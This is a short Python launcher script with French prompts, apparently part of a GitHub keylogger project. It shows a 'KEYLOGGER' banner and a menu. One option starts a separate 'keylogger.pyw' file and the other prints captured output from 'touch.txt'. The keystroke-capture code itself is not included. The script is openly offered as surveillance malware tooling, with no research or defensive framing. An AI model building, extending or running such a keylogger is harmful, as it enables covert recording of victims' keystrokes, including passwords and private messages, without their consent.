from pynput.keyboard import Listener
import logging
from colorama import Fore
import os
import time

result = open('touch.txt', 'r')
read = result.readlines()
keylogger = 'keylogger.pyw'

print("""
██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
""")
time.sleep(1)
print(" Bienvenue sur le keylogger! ")
time.sleep(0.5)
print(" Github: https://github.com/Cyber-Stars ")
time.sleep(1)
print("")
print("[ 1 ]: Keylogger")
print("[ 2 ]: Result")
print("")
c = input(" Choisissez votre choix: ")
if c == "1":
    print(" Lancement du keylogger...")
    os.system(keylogger)
    print("keylogger lancer!")

if c == "2":
    print(read)  
    
input("Appuyer 3 fois pour fermer")
input("Appuyer 2 fois pour fermer")
input("Appuyer 1 fois pour fermer")
exit()

